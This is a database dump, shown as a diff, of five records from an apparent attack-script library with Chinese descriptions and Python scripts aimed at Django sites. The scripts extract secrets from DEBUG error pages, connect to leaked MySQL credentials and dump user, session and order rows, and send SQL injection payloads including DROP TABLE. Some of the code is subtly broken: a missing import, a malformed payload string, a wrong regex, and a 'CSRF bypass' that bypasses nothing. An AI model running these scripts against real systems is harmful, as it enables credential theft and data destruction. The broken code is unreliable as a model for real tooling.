@@ -1,0 +1,393 @@
+-[ RECORD 1 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+id             | 1
+name           | django-debug-true-exploit
+description    | 自動化分析目標是否啟用 Django DEBUG=True，並提取錯誤頁面中的敏感資訊（如資料庫連線字串、密鑰、環境變數等）。
+instructions   | 1. 執行腳本：`python django_debug_true_exploit.py --target <目標URL>`                                                                                                                +
+               | 2. 腳本會自動發送 GET 請求，檢查是否有 Django 錯誤頁面。                                                                                                                             +
+               | 3. 如發現 DEBUG=True，會提取敏感資訊（如資料庫連線字串、密鑰等）。                                                                                                                   +
+               | 4. 輸出結果會顯示外洩的敏感資訊，並提醒管理員進行修復。
+script_content | import requests                                                                                                                                                                      +
+               | from bs4 import BeautifulSoup                                                                                                                                                        +
+               | import re                                                                                                                                                                            +
+               | import argparse                                                                                                                                                                      +
+               |                                                                                                                                                                                      +
+               | def check_django_debug_true(target_url):                                                                                                                                             +
+               |     """                                                                                                                                                                              +
+               |     檢查目標是否啟用 Django DEBUG=True，並提取敏感資訊。                                                                                                                             +
+               |     """                                                                                                                                                                              +
+               |     try:                                                                                                                                                                             +
+               |         # 發送 GET 請求                                                                                                                                                              +
+               |         response = requests.get(target_url, timeout=10)                                                                                                                              +
+               |         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                           +
+               |                                                                                                                                                                                      +
+               |         # 檢查是否有 Django 錯誤頁面                                                                                                                                                 +
+               |         if "DEBUG = True" in response.text or "Django" in response.text:                                                                                                             +
+               |             print("✅ 目標可能啟用 Django DEBUG=True")                                                                                                                               +
+               |                                                                                                                                                                                      +
+               |             # 提取資料庫連線字串                                                                                                                                                     +
+               |             db_pattern = re.compile(r"DATABASE_URL=([^\s]+)")                                                                                                                        +
+               |             db_match = db_pattern.search(response.text)                                                                                                                              +
+               |             if db_match:                                                                                                                                                             +
+               |                 print(f"🔴 資料庫連線字串外洩: {db_match.group(1)}")                                                                                                                 +
+               |                 return db_match.group(1)                                                                                                                                             +
+               |                                                                                                                                                                                      +
+               |             # 提取 Django 密鑰                                                                                                                                                       +
+               |             secret_key_pattern = re.compile(r"SECRET_KEY=([^\s]+)")                                                                                                                  +
+               |             secret_key_match = secret_key_pattern.search(response.text)                                                                                                              +
+               |             if secret_key_match:                                                                                                                                                     +
+               |                 print(f"🔴 Django Secret Key 外洩: {secret_key_match.group(1)}")                                                                                                     +
+               |                 return secret_key_match.group(1)                                                                                                                                     +
+               |                                                                                                                                                                                      +
+               |             # 提取其他敏感資訊                                                                                                                                                       +
+               |             sensitive_patterns = [                                                                                                                                                   +
+               |                 r"HOST: ([^\s]+)",                                                                                                                                                   +
+               |                 r"USER: ([^\s]+)",                                                                                                                                                   +
+               |                 r"PASSWORD: ([^\s]+)",                                                                                                                                               +
+               |                 r"PORT: ([^\d]+)",                                                                                                                                                   +
+               |             ]                                                                                                                                                                        +
+               |             for pattern in sensitive_patterns:                                                                                                                                       +
+               |                 match = re.search(pattern, response.text)                                                                                                                            +
+               |                 if match:                                                                                                                                                            +
+               |                     print(f"🔴 敏感資訊外洩: {match.group(1)}")                                                                                                                      +
+               |                     return match.group(1)                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         else:                                                                                                                                                                        +
+               |             print("❌ 目標未啟用 Django DEBUG=True 或未發現錯誤頁面")                                                                                                                +
+               |             return None                                                                                                                                                              +
+               |                                                                                                                                                                                      +
+               |     except Exception as e:                                                                                                                                                           +
+               |         print(f"❌ 請求失敗: {e}")                                                                                                                                                   +
+               |         return None                                                                                                                                                                  +
+               |                                                                                                                                                                                      +
+               | if __name__ == "__main__":                                                                                                                                                           +
+               |     parser = argparse.ArgumentParser(description="檢查目標是否啟用 Django DEBUG=True，並提取敏感資訊")                                                                               +
+               |     parser.add_argument("--target", required=True, help="目標 URL")                                                                                                                  +
+               |     args = parser.parse_args()                                                                                                                                                       +
+               |     check_django_debug_true(args.target)
+language       | python
+tags           | ["django", "debug", "sensitive-data-leak", "error-page"]
+usage_count    | 0
+created_at     | 2026-05-08 14:59:29.289032+00
+updated_at     | 2026-05-08 14:59:29.289043+00
+-[ RECORD 2 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+id             | 2
+name           | mysql-connection-string-exploit
+description    | 自動化連接外洩的 MySQL 資料庫，並提取敏感資料（如使用者資料、Session、訂單等）。
+instructions   | 1. 執行腳本：`python mysql_connection_string_exploit.py --connection-string <外洩的MySQL連線字串>`                                                                                   +
+               | 2. 腳本會自動解析連線字串，並嘗試連接資料庫。                                                                                                                                        +
+               | 3. 如連接成功，會列出所有資料表，並提取敏感資料（如 auth_user、django_session 等）。                                                                                                 +
+               | 4. 輸出結果會顯示提取的敏感資料，並提醒管理員進行修復。
+script_content | import mysql.connector                                                                                                                                                               +
+               | import argparse                                                                                                                                                                      +
+               | import re                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               | def extract_db_info_from_url(db_url):                                                                                                                                                +
+               |     """                                                                                                                                                                              +
+               |     從 MySQL 連線字串中提取資料庫資訊。                                                                                                                                              +
+               |     """                                                                                                                                                                              +
+               |     pattern = r"mysql://([^:]+):([^@]+)@([^:]+):(\d+)/([^\s]+)"                                                                                                                      +
+               |     match = re.match(pattern, db_url)                                                                                                                                                +
+               |     if match:                                                                                                                                                                        +
+               |         return {                                                                                                                                                                     +
+               |             "user": match.group(1),                                                                                                                                                  +
+               |             "password": match.group(2),                                                                                                                                              +
+               |             "host": match.group(3),                                                                                                                                                  +
+               |             "port": match.group(4),                                                                                                                                                  +
+               |             "database": match.group(5),                                                                                                                                              +
+               |         }                                                                                                                                                                            +
+               |     return None                                                                                                                                                                      +
+               |                                                                                                                                                                                      +
+               | def connect_and_extract_data(db_info):                                                                                                                                               +
+               |     """                                                                                                                                                                              +
+               |     連接 MySQL 資料庫，並提取敏感資料。                                                                                                                                              +
+               |     """                                                                                                                                                                              +
+               |     try:                                                                                                                                                                             +
+               |         conn = mysql.connector.connect(                                                                                                                                              +
+               |             host=db_info["host"],                                                                                                                                                    +
+               |             port=int(db_info["port"]),                                                                                                                                               +
+               |             user=db_info["user"],                                                                                                                                                    +
+               |             password=db_info["password"],                                                                                                                                            +
+               |             database=db_info["database"],                                                                                                                                            +
+               |         )                                                                                                                                                                            +
+               |         print("✅ 成功連接 MySQL 資料庫")                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         cursor = conn.cursor()                                                                                                                                                       +
+               |                                                                                                                                                                                      +
+               |         # 列出所有資料表                                                                                                                                                             +
+               |         cursor.execute("SHOW TABLES;")                                                                                                                                               +
+               |         tables = cursor.fetchall()                                                                                                                                                   +
+               |         print("📊 資料表清單:")                                                                                                                                                      +
+               |         for table in tables:                                                                                                                                                         +
+               |             print(f"  - {table[0]}")                                                                                                                                                 +
+               |                                                                                                                                                                                      +
+               |         # 提取敏感資料                                                                                                                                                               +
+               |         sensitive_tables = ["auth_user", "django_session", "cake_order", "account_emailaddress"]                                                                                     +
+               |         for table in sensitive_tables:                                                                                                                                               +
+               |             if any(table in t[0] for t in tables):                                                                                                                                   +
+               |                 print(f"\n🔍 提取 {table} 表的資料:")                                                                                                                                +
+               |                 cursor.execute(f"SELECT * FROM {table} LIMIT 1;")                                                                                                                    +
+               |                 data = cursor.fetchall()                                                                                                                                             +
+               |                 for row in data:                                                                                                                                                     +
+               |                     print(row)                                                                                                                                                       +
+               |                                                                                                                                                                                      +
+               |         conn.close()                                                                                                                                                                 +
+               |                                                                                                                                                                                      +
+               |     except Exception as e:                                                                                                                                                           +
+               |         print(f"❌ 連接失敗: {e}")                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               | if __name__ == "__main__":                                                                                                                                                           +
+               |     parser = argparse.ArgumentParser(description="連接外洩的 MySQL 資料庫，並提取敏感資料")                                                                                          +
+               |     parser.add_argument("--connection-string", required=True, help="外洩的 MySQL 連線字串")                                                                                          +
+               |     args = parser.parse_args()                                                                                                                                                       +
+               |     db_info = extract_db_info_from_url(args.connection_string)                                                                                                                       +
+               |     if db_info:                                                                                                                                                                      +
+               |         connect_and_extract_data(db_info)                                                                                                                                            +
+               |     else:                                                                                                                                                                            +
+               |         print("❌ 無法解析 MySQL 連線字串")
+language       | python
+tags           | ["mysql", "database", "sensitive-data-extraction", "connection-string"]
+usage_count    | 0
+created_at     | 2026-05-08 14:59:39.668079+00
+updated_at     | 2026-05-08 14:59:39.668089+00
+-[ RECORD 3 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+id             | 3
+name           | django-sql-injection-automated-test
+description    | 自動化測試 Django 應用程式中的 SQL 注入風險，特別針對未正確使用 ORM 的查詢（如直接拼接 SQL 字串）。
+instructions   | 1. 執行腳本：`python django_sql_injection_test.py --target <目標URL> --form-fields <表單欄位>`                                                                                       +
+               | 2. 腳本會自動發送惡意 payload（如 `" OR 1=1 --`、`' OR '1'='1` 等）到指定表單欄位。                                                                                                  +
+               | 3. 如發現 SQL 錯誤或異常響應，會提示可能存在 SQL 注入風險。                                                                                                                          +
+               | 4. 輸出結果會顯示測試結果，並提醒開發者使用參數化查詢。
+script_content | import requests                                                                                                                                                                      +
+               | import argparse                                                                                                                                                                      +
+               | import re                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               | def test_sql_injection(target_url, form_fields):                                                                                                                                     +
+               |     """                                                                                                                                                                              +
+               |     測試目標是否存在 SQL 注入風險。                                                                                                                                                  +
+               |     """                                                                                                                                                                              +
+               |     try:                                                                                                                                                                             +
+               |         # 發送 GET 請求，獲取 CSRF Token                                                                                                                                             +
+               |         response = requests.get(target_url, timeout=10)                                                                                                                              +
+               |         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                           +
+               |                                                                                                                                                                                      +
+               |         # 提取 CSRF Token                                                                                                                                                            +
+               |         csrf_token = None                                                                                                                                                            +
+               |         csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})                                                                                                             +
+               |         if csrf_input:                                                                                                                                                               +
+               |             csrf_token = csrf_input.get("value")                                                                                                                                     +
+               |                                                                                                                                                                                      +
+               |         if not csrf_token:                                                                                                                                                           +
+               |             print("❌ 無法獲取 CSRF Token")                                                                                                                                          +
+               |             return                                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               |         # SQL 注入 payload                                                                                                                                                           +
+               |         payloads = [                                                                                                                                                                 +
+               |             "\" OR 1=1 --",                                                                                                                                                          +
+               |             "' OR '1'='1",                                                                                                                                                           +
+               |             "' OR 1=1 --",                                                                                                                                                           +
+               |             ""; DROP TABLE users; --",                                                                                                                                               +
+               |         ]                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         # 測試每個表單欄位                                                                                                                                                           +
+               |         for field in form_fields:                                                                                                                                                    +
+               |             print(f"\n🔍 測試欄位: {field}")                                                                                                                                         +
+               |             for payload in payloads:                                                                                                                                                 +
+               |                 data = {field: payload}                                                                                                                                              +
+               |                 headers = {                                                                                                                                                          +
+               |                     "Referer": target_url,                                                                                                                                           +
+               |                     "Content-Type": "application/x-www-form-urlencoded",                                                                                                             +
+               |                 }                                                                                                                                                                    +
+               |                                                                                                                                                                                      +
+               |                 # 提交表單                                                                                                                                                           +
+               |                 response = requests.post(                                                                                                                                            +
+               |                     target_url,                                                                                                                                                      +
+               |                     data=data,                                                                                                                                                       +
+               |                     headers=headers,                                                                                                                                                 +
+               |                     cookies={"csrftoken": csrf_token},                                                                                                                               +
+               |                     timeout=10,                                                                                                                                                      +
+               |                 )                                                                                                                                                                    +
+               |                                                                                                                                                                                      +
+               |                 # 檢查響應是否包含 SQL 錯誤                                                                                                                                          +
+               |                 if "SQL" in response.text or "syntax" in response.text or "error" in response.text.lower():                                                                          +
+               |                     print(f"🔴 可能存在 SQL 注入風險: {field} = {payload}")                                                                                                          +
+               |                     return                                                                                                                                                           +
+               |                                                                                                                                                                                      +
+               |         print("✅ 未發現明顯的 SQL 注入風險")                                                                                                                                        +
+               |                                                                                                                                                                                      +
+               |     except Exception as e:                                                                                                                                                           +
+               |         print(f"❌ 請求失敗: {e}")                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               | if __name__ == "__main__":                                                                                                                                                           +
+               |     parser = argparse.ArgumentParser(description="自動化測試 Django 應用程式中的 SQL 注入風險")                                                                                      +
+               |     parser.add_argument("--target", required=True, help="目標 URL")                                                                                                                  +
+               |     parser.add_argument("--form-fields", required=True, nargs="+", help="表單欄位名稱")                                                                                              +
+               |     args = parser.parse_args()                                                                                                                                                       +
+               |     test_sql_injection(args.target, args.form_fields)
+language       | python
+tags           | ["django", "sql-injection", "orm", "automated-test"]
+usage_count    | 0
+created_at     | 2026-05-08 14:59:49.490509+00
+updated_at     | 2026-05-08 14:59:49.490518+00
+-[ RECORD 4 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+id             | 4
+name           | csrf-token-bypass-automation
+description    | 自動化繞過 Django 的 CSRF 保護機制，並提交表單以測試後端是否存在其他漏洞（如 SQLi、XSS 等）。
+instructions   | 1. 執行腳本：`python csrf_bypass.py --target <目標URL> --form-fields <表單欄位>`                                                                                                     +
+               | 2. 腳本會自動獲取 CSRF Token 與 Cookie，並提交表單。                                                                                                                                 +
+               | 3. 如成功提交表單，會返回響應內容，並提示後續測試方向。                                                                                                                              +
+               | 4. 輸出結果會顯示 CSRF 繞過是否成功，並提醒開發者啟用 CSRF 保護。
+script_content | import requests                                                                                                                                                                      +
+               | from bs4 import BeautifulSoup                                                                                                                                                        +
+               | import argparse                                                                                                                                                                      +
+               |                                                                                                                                                                                      +
+               | def csrf_bypass(target_url, form_fields):                                                                                                                                            +
+               |     """                                                                                                                                                                              +
+               |     自動化繞過 Django 的 CSRF 保護機制，並提交表單。                                                                                                                                 +
+               |     """                                                                                                                                                                              +
+               |     try:                                                                                                                                                                             +
+               |         # 發送 GET 請求，獲取 CSRF Token 與 Cookie                                                                                                                                   +
+               |         response = requests.get(target_url, timeout=10)                                                                                                                              +
+               |         soup = BeautifulSoup(response.text, 'html.parser')                                                                                                                           +
+               |                                                                                                                                                                                      +
+               |         # 提取 CSRF Token                                                                                                                                                            +
+               |         csrf_token = None                                                                                                                                                            +
+               |         csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})                                                                                                             +
+               |         if csrf_input:                                                                                                                                                               +
+               |             csrf_token = csrf_input.get("value")                                                                                                                                     +
+               |                                                                                                                                                                                      +
+               |         if not csrf_token:                                                                                                                                                           +
+               |             print("❌ 無法獲取 CSRF Token")                                                                                                                                          +
+               |             return                                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               |         # 提取 CSRF Cookie                                                                                                                                                           +
+               |         csrf_cookie = None                                                                                                                                                           +
+               |         if "csrftoken" in response.cookies:                                                                                                                                          +
+               |             csrf_cookie = response.cookies["csrftoken"]                                                                                                                              +
+               |                                                                                                                                                                                      +
+               |         if not csrf_cookie:                                                                                                                                                          +
+               |             print("❌ 無法獲取 CSRF Cookie")                                                                                                                                         +
+               |             return                                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               |         # 提交表單                                                                                                                                                                   +
+               |         data = {}                                                                                                                                                                    +
+               |         for field in form_fields:                                                                                                                                                    +
+               |             if field == "csrfmiddlewaretoken":                                                                                                                                       +
+               |                 data[field] = csrf_token                                                                                                                                             +
+               |             else:                                                                                                                                                                    +
+               |                 data[field] = "test"                                                                                                                                                 +
+               |                                                                                                                                                                                      +
+               |         headers = {                                                                                                                                                                  +
+               |             "Referer": target_url,                                                                                                                                                   +
+               |             "Content-Type": "application/x-www-form-urlencoded",                                                                                                                     +
+               |         }                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         response = requests.post(                                                                                                                                                    +
+               |             target_url,                                                                                                                                                              +
+               |             data=data,                                                                                                                                                               +
+               |             headers=headers,                                                                                                                                                         +
+               |             cookies={"csrftoken": csrf_cookie},                                                                                                                                      +
+               |             timeout=10,                                                                                                                                                              +
+               |         )                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         if response.status_code == 302:                                                                                                                                              +
+               |             print("✅ CSRF 繞過成功！伺服器接受表單提交。")                                                                                                                          +
+               |             print(f"📍 重定向位置: {response.headers.get('Location')}")                                                                                                              +
+               |             return response                                                                                                                                                          +
+               |         elif response.status_code == 403:                                                                                                                                            +
+               |             print("❌ CSRF 繞過失敗，伺服器拒絕表單提交。")                                                                                                                          +
+               |             return None                                                                                                                                                              +
+               |         else:                                                                                                                                                                        +
+               |             print(f"⚠️ 伺服器響應: {response.status_code}")                                                                                                                           +
+               |             return response                                                                                                                                                          +
+               |                                                                                                                                                                                      +
+               |     except Exception as e:                                                                                                                                                           +
+               |         print(f"❌ 請求失敗: {e}")                                                                                                                                                   +
+               |         return None                                                                                                                                                                  +
+               |                                                                                                                                                                                      +
+               | if __name__ == "__main__":                                                                                                                                                           +
+               |     parser = argparse.ArgumentParser(description="自動化繞過 Django 的 CSRF 保護機制")                                                                                               +
+               |     parser.add_argument("--target", required=True, help="目標 URL")                                                                                                                  +
+               |     parser.add_argument("--form-fields", required=True, nargs="+", help="表單欄位名稱")                                                                                              +
+               |     args = parser.parse_args()                                                                                                                                                       +
+               |     csrf_bypass(args.target, args.form_fields)
+language       | python
+tags           | ["csrf", "django", "bypass", "form-submission"]
+usage_count    | 0
+created_at     | 2026-05-08 14:59:58.542009+00
+updated_at     | 2026-05-08 14:59:58.542023+00
+-[ RECORD 5 ]--+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+id             | 5
+name           | security-headers-missing-detection
+description    | 自動化檢測目標網站的安全標頭缺失情況，並提供修復建議（如 CSP、HSTS、X-Frame-Options 等）。
+instructions   | 1. 執行腳本：`python security_headers_check.py --target <目標URL>`                                                                                                                   +
+               | 2. 腳本會發送 GET 請求，並檢查響應標頭中的安全標頭。                                                                                                                                 +
+               | 3. 如發現缺少安全標頭，會提示修復建議。                                                                                                                                              +
+               | 4. 輸出結果會顯示缺少的安全標頭，並提供 Django 設定範例。
+script_content | import requests                                                                                                                                                                      +
+               | import argparse                                                                                                                                                                      +
+               |                                                                                                                                                                                      +
+               | def check_security_headers(target_url):                                                                                                                                              +
+               |     """                                                                                                                                                                              +
+               |     檢查目標網站的安全標頭缺失情況。                                                                                                                                                 +
+               |     """                                                                                                                                                                              +
+               |     try:                                                                                                                                                                             +
+               |         response = requests.get(target_url, timeout=10)                                                                                                                              +
+               |         headers = response.headers                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               |         # 安全標頭檢查清單                                                                                                                                                           +
+               |         security_headers = {                                                                                                                                                         +
+               |             "CSP": "Content-Security-Policy",                                                                                                                                        +
+               |             "HSTS": "Strict-Transport-Security",                                                                                                                                     +
+               |             "X-Frame-Options": "X-Frame-Options",                                                                                                                                    +
+               |             "X-Content-Type-Options": "X-Content-Type-Options",                                                                                                                      +
+               |             "Referrer-Policy": "Referrer-Policy",                                                                                                                                    +
+               |             "Cross-Origin-Opener-Policy": "Cross-Origin-Opener-Policy",                                                                                                              +
+               |         }                                                                                                                                                                            +
+               |                                                                                                                                                                                      +
+               |         print("🔍 安全標頭檢查結果:")                                                                                                                                                +
+               |         missing_headers = []                                                                                                                                                         +
+               |         for header, key in security_headers.items():                                                                                                                                 +
+               |             if key not in headers:                                                                                                                                                   +
+               |                 print(f"  ❌ 缺少: {header}")                                                                                                                                        +
+               |                 missing_headers.append(header)                                                                                                                                       +
+               |             else:                                                                                                                                                                    +
+               |                 print(f"  ✅ 存在: {header}")                                                                                                                                        +
+               |                                                                                                                                                                                      +
+               |         if not missing_headers:                                                                                                                                                      +
+               |             print("\n✅ 所有安全標頭均已設定")                                                                                                                                       +
+               |         else:                                                                                                                                                                        +
+               |             print("\n🛡️ 修復建議:")                                                                                                                                                   +
+               |             for header in missing_headers:                                                                                                                                           +
+               |                 if header == "CSP":                                                                                                                                                  +
+               |                     print("  - 添加 CSP 標頭，限制資源載入來源:")                                                                                                                    +
+               |                     print("    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:")+
+               |                 elif header == "HSTS":                                                                                                                                               +
+               |                     print("  - 添加 HSTS 標頭，強制使用 HTTPS:")                                                                                                                     +
+               |                     print("    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload")                                                                             +
+               |                 elif header == "X-Frame-Options":                                                                                                                                    +
+               |                     print("  - 添加 X-Frame-Options 標頭，防止 Clickjacking:")                                                                                                       +
+               |                     print("    X-Frame-Options: DENY")                                                                                                                               +
+               |                 elif header == "X-Content-Type-Options":                                                                                                                             +
+               |                     print("  - 添加 X-Content-Type-Options 標頭，防止 MIME 型態嗅探:")                                                                                               +
+               |                     print("    X-Content-Type-Options: nosniff")                                                                                                                     +
+               |                 elif header == "Referrer-Policy":                                                                                                                                    +
+               |                     print("  - 添加 Referrer-Policy 標頭，限制 Referer 資訊洩露:")                                                                                                   +
+               |                     print("    Referrer-Policy: same-origin")                                                                                                                        +
+               |                 elif header == "Cross-Origin-Opener-Policy":                                                                                                                         +
+               |                     print("  - 添加 Cross-Origin-Opener-Policy 標頭，防止跨站資源共用:")                                                                                             +
+               |                     print("    Cross-Origin-Opener-Policy: same-origin")                                                                                                             +
+               |                                                                                                                                                                                      +
+               |     except Exception as e:                                                                                                                                                           +
+               |         print(f"❌ 請求失敗: {e}")                                                                                                                                                   +
+               |                                                                                                                                                                                      +
+               | if __name__ == "__main__":                                                                                                                                                           +
+               |     parser = argparse.ArgumentParser(description="自動化檢測目標網站的安全標頭缺失情況")                                                                                             +
+               |     parser.add_argument("--target", required=True, help="目標 URL")                                                                                                                  +
+               |     args = parser.parse_args()                                                                                                                                                       +
+               |     check_security_headers(args.target)
+language       | python
+tags           | ["security-headers", "csp", "hsts", "x-frame-options", "django"]
+usage_count    | 0
+created_at     | 2026-05-08 15:00:08.63518+00
+updated_at     | 2026-05-08 15:00:08.635188+00
+
